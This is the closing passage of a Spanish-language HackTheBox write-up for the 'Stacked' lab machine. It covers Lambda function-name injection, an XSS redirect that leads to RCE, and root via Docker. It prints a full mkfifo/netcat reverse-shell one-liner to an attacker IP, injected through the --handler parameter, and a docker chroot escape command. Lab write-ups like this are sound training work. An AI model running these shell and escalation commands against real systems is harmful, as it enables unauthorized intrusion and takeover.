+<p><img src="https://user-images.githubusercontent.com/69093629/162548779-ede0739e-2266-4289-b29c-b64d7e9a0f85.png" alt="0" /></p>
+
+<p>Deje todos por defecto menos <code class="language-plaintext highlighter-rouge">function-name</code> y <code class="language-plaintext highlighter-rouge">zip-file</code>, en <code class="language-plaintext highlighter-rouge">function-name</code> le inyecte mi código malicioso, y en <code class="language-plaintext highlighter-rouge">zip-file</code> la ruta del ZIP que contenía <code class="language-plaintext highlighter-rouge">lambda.js</code>.</p>
+
+<p>El siguiente paso fue usar <code class="language-plaintext highlighter-rouge">awscli</code> para interactuar con la API y así crear mi función lambda.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162548887-87615e4f-c452-4034-b658-bf520ac56df8.png" alt="0" /></p>
+
+<p>Se me creo mi función lambda, pero tenía que invocarla, para ello use el parámetro <code class="language-plaintext highlighter-rouge">invoke</code> especificándole <code class="language-plaintext highlighter-rouge">function-name</code> y exportando el resultado en un archivo llamado <code class="language-plaintext highlighter-rouge">output</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162548957-73e9d679-a8a5-49fc-b4b4-ef37401a9ced.png" alt="0" /></p>
+
+<h3 id="rce">RCE</h3>
+
+<p>La ejecución remota de comandos solo se acontecía si el usuario visitaba el <code class="language-plaintext highlighter-rouge">dashboard</code>, en el archivo <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> vi que este podría estar montado en <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080/</code> pero yo no tenía acceso a él externamente, por lo que aproveche el XSS para redirigir el usuario con el objeto <code class="language-plaintext highlighter-rouge">document.location</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162549411-2edc91d7-7d62-4a61-9019-ca3bd11290f1.png" alt="0" /></p>
+
+<p>Un tiempo después recibí una petición GET a mi servidor.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162549109-72c7e9a8-04e1-4ff1-aaff-2c8c83b68a8e.png" alt="0" /></p>
+
+<p>Ya tenía ejecución remota de comandos, ahora solo me faltaba ganar acceso a la máquina, para ello concatené un Shell inverso con <code class="language-plaintext highlighter-rouge">mkfifo</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162549320-3291c746-de1a-4597-98ea-7b48e42bde57.png" alt="0" /></p>
+
+<p>Invoque la función, redirigí al usuario y gane una Shell en un contenedor.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162549540-b85922a2-7f19-4cba-a367-6308123a7dab.png" alt="0" /></p>
+
+<h3 id="usertxt">user.txt</h3>
+
+<p>Ya podía visualizar la <em>flag</em> del usuario.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162549771-afb6a3bf-1c50-4db6-980a-78a9af2799aa.png" alt="usetxt" /></p>
+
+<h3 id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS</h3>
+
+<p>Para la escalada de privilegios me transferí <code class="language-plaintext highlighter-rouge">pspy64</code> y vi las tareas que se ejecutaban a intervalos regulares de tiempo.</p>
+
+<p>Vi que se ejecutaba Docker concatenando el parámetro <code class="language-plaintext highlighter-rouge">--handler</code> a la hora de crear la función lambda, por lo que si creaba mi función añadiendo <code class="language-plaintext highlighter-rouge">$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;1|nc 10.10.16.59 443 &amp;gt;/tmp/f)</code> era muy probable que me ejecutara el comando y ganase acceso como <code class="language-plaintext highlighter-rouge">root</code> por <code class="language-plaintext highlighter-rouge">nc</code> en el contenedor.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162550680-a2f79325-d58c-4443-9d8f-0e2f3d6bfc86.png" alt="shellcomorootencontentedor" /></p>
+
+<p>Ahora podia ejecutar el comando <code class="language-plaintext highlighter-rouge">docker</code> con sudo, me dirigí a <code class="language-plaintext highlighter-rouge">gtfobins</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162550803-31a19264-9028-4e15-9b6d-b353e12a5618.png" alt="Captura de pantalla 28" /></p>
+
+<p>Utilice el comando <code class="language-plaintext highlighter-rouge">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code> para crear una montura raíz de la máquina en <code class="language-plaintext highlighter-rouge">/mnt</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162550953-cb22a129-092a-440b-bad7-d9fcefaa12cb.png" alt="0" /></p>
+
+<h3 id="roottxt">root.txt</h3>
+
+<p>Me entable otro Shell inverso por netcat y me ejecute una bash al nuevo contenedor <code class="language-plaintext highlighter-rouge">docker</code> en ejecución, ya pude visualizar la <em>flag</em> de root.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162551321-5a1dd834-02ee-4f32-ae73-ab7d297ab8e8.png" alt="0" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#aws" class="page__taxonomy-item" rel="tag">AWS</a><span class="sep">, </span>
+    
+      <a href="/tags/#docker" class="page__taxonomy-item" rel="tag">Docker</a><span class="sep">, </span>
+    
+      <a href="/tags/#ssrf" class="page__taxonomy-item" rel="tag">SSRF</a><span class="sep">, </span>
+    
+      <a href="/tags/#xss" class="page__taxonomy-item" rel="tag">XSS</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-04-09T00:00:00-04:00"></p>
+
+
+      </footer>
+
+      <section class="page__share">
+    
+      <h4 class="page__share-title">Share on</h4>
+    
+  
+    <a href="https://twitter.com/intent/tweet?text=Stacked+-+HackTheBox%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FStacked%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FStacked%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FStacked%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  </section>
+  
+
+      
+  <nav class="pagination">
+    
+      <a href="/hackthebox/OpenAdmin/" class="pagination--pager" title="OpenAdmin - HackTheBox
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+    <ul class="social-icons">
+      
+        <li><strong>Follow:</strong></li>
+      
+  
+      
+        
+          
+            <li><a href="https://twitter.com/Fr4nzisko1" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+        
+          
+            <li><a href="https://github.com/Fr4nzisko" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/jose-francisco-flores-/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin-in" aria-hidden="true"></i> Linkedin</a></li>
+          
+        
+      
+    </ul>
+  </div>
+  
+  <div class="page__footer-copyright">&copy; 2022 Fr4nzisko</div>
+  
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+    <script>
+    'use strict';
+  
+    (function() {
+      var commentContainer = document.querySelector('#utterances-comments');
+  
+      if (!commentContainer) {
+        return;
+      }
+  
+      var script = document.createElement('script');
+      script.setAttribute('src', 'https://utteranc.es/client.js');
+      script.setAttribute('repo', 'Fr4nzisko/fr4nzisko.github.io');
+      script.setAttribute('issue-term', 'pathname');
+      script.setAttribute('theme', 'github-light');
+      script.setAttribute('crossorigin', 'anonymous');
+  
+      commentContainer.appendChild(script);
+    })();
+  </script>
+  
+  
+
+
+
+
+
+  </body>
+</html>
